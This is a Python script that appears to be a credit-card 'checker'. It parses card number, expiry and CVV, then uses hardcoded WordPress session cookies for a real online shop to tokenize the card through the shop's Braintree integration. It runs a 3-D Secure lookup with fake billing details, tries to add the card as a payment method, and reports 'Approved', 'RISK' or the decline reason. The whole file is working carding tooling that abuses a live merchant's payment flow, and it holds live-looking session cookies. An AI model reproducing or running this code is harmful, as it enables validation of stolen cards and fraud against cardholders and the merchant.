def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def Tele(ccx):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	
	ccx = ccx.strip()
	parts = re.split('[|/:]', ccx)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	
	user = user_agent.generate_user_agent()


	cookies = {
    'wordpress_sec_efb38fd9efa18ec299b212a75f573725': 'modyhamdgggaznsalah%7C1717845918%7C3mb0p3xXLkWckDgphTtBubHlqYJZktka69IG26mIXWH%7C1b2a66db63dcfda49f4d6482a297523e50622c0fe4d0b38a5dfe05a430114626',
    'wordpress_logged_in_efb38fd9efa18ec299b212a75f573725': 'modyhamdgggaznsalah%7C1717845918%7C3mb0p3xXLkWckDgphTtBubHlqYJZktka69IG26mIXWH%7Ca84651164db9e21acf34e390aaaa31db5105fad9f6802fd8943e5f9dd37dae53',
  'wp_woocommerce_session_efb38fd9efa18ec299b212a75f573725': '15226%7C%7C1716809092%7C%7C1716805492%7C%7C3715da73e7b2df6d20ee09bd78622935',
    'wfwaf-authcookie-7d0d490a75c9471b1f8c1a600eed0a0c': '15226%7Cother%7C%7Cf87be6a4ba25349b1b8ad9cb56c8c77f4c475cc58d9120a07cded196ef844062',
}

	headers = {
    'authority': 'husbands-paris.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'referer': 'https://husbands-paris.com/en/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	res1 = requests.get('https://husbands-paris.com/en/my-account/add-payment-method/', cookies=cookies, headers=headers)
	r4 = res1.text
	anonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r4).group(1)
	T = capture(r4,'wc_braintree_client_token = ["','"]')
	encoded_text = T
	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
	headers = {
        'accept': '*/*',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user,
    }

	json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': 'b17c9cd3-08a2-45ad-bf9b-c44450c8a642',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                    'billingAddress': {
                        'postalCode': '92866',
                        'streetAddress': '1107 E Chapman Ave',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

	res2 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	token = res2.json()['data']['tokenizeCreditCard']['token']


	headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://husbands-paris.com',
    'pragma': 'no-cache',
    'referer': 'https://husbands-paris.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'amount': '0.00',
    'browserColorDepth': 24,
    'browserJavaEnabled': False,
    'browserJavascriptEnabled': True,
    'browserLanguage': 'ar',
    'browserScreenHeight': 895,
    'browserScreenWidth': 393,
    'browserTimeZone': -180,
    'deviceChannel': 'Browser',
    'additionalInfo': {
        'billingLine1': 'hheheheh',
        'billingLine2': '',
        'billingCity': 'hhhdbrb',
        'billingState': 'NY',
        'billingPostalCode': '10080',
        'billingCountryCode': 'US',
        'billingPhoneNumber': '+202683835383',
        'billingGivenName': 'hehheheheb',
        'billingSurname': 'hdhrhrbb',
        'email': 'hfjfjgjfkfjjfjfj@gmail.com',
    },
    'bin': '440393',
    'dfReferenceId': '0_2fbc997e-d3d4-4506-87b8-81355e086cae',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.101.1',
        'cardinalDeviceDataCollectionTimeElapsed': 4101,
        'issuerDeviceDataCollectionTimeElapsed': 1613,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': au,
    'braintreeLibraryVersion': 'braintree/web/3.101.1',
    '_meta': {
        'merchantAppId': 'husbands-paris.com',
        'platform': 'web',
        'sdkVersion': '3.101.1',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': 'b17c9cd3-08a2-45ad-bf9b-c44450c8a642',
    },
}

	res3 = requests.post(
    f'https://api.braintreegateway.com/merchants/tqrv56bq2khzqk35/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)





	nonce = res3.json()['paymentMethod']['nonce']
    
    




	

	headers = {
    'authority': 'husbands-paris.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://husbands-paris.com',
    'pragma': 'no-cache',
    'referer': 'https://husbands-paris.com/en/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': nonce,
    'braintree_cc_device_data': '{"device_session_id":"e36d6eeea156c6963bc507e94e9c8757","fraud_merchant_id":null,"correlation_id":"2456c41dce56a08cf5bc1425a4924b3e"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/tqrv56bq2khzqk35/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/tqrv56bq2khzqk35"},"merchantId":"tqrv56bq2khzqk35","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"IE","currencyCode":"USD","merchantIdentifier":"tqrv56bq2khzqk35","supportedNetworks":["visa","mastercard","amex"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["American Express","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIxZWM5YTliMy0zOWZlLTQ5YzgtYmQxZS1lYmE2M2IyNWJhM2YiLCJpYXQiOjE3MTY2MzYyNDcsImV4cCI6MTcxNjY0MzQ0NywiaXNzIjoiNjU3YTRiZjEwYmJmYWI0NmQ3MjhjY2U5IiwiT3JnVW5pdElkIjoiNjU3YTRiZjEzYzJmNTE1ZTAyZWMxMjViIn0.f2jwnQCvHXIXi9roM3ePwvsT4J33zFoR3EnDfVogasQ"},"androidPay":{"displayName":"Husbands Paris","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTY3MjI2NDcsImp0aSI6IjI5MzRiNGZmLTM3YTUtNDg1OC04NjFjLTdhMDE1ZDEwNWRhZCIsInN1YiI6InRxcnY1NmJxMmtoenFrMzUiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InRxcnY1NmJxMmtoenFrMzUiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.oDhOri6lzVmapobYDv3qTiyBnqd0B0n5IW2fn-_n7fo_BRiFf5B3tkR8RUyGzQGzVPUjQz3A548F3FNeV367vQ","paypalClientId":null,"supportedNetworks":["visa","mastercard","amex"]},"paypalEnabled":true,"paypal":{"displayName":"Husbands Paris","clientId":"AQ1508abMajQ4VRW2xqHw8nO0k4lTpyoOdC3blQptbuIpZXlzlgW4aR6lv3ClGVXN6lKeM0tKkd5_vT1","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"husbandsparisUSD","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': anonce,
    '_wp_http_referer': '/en/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post(
    'https://husbands-paris.com/en/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)

	pattern = r'Reason: (.*?)\s*</li>'
    
	text = response.text
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	
	
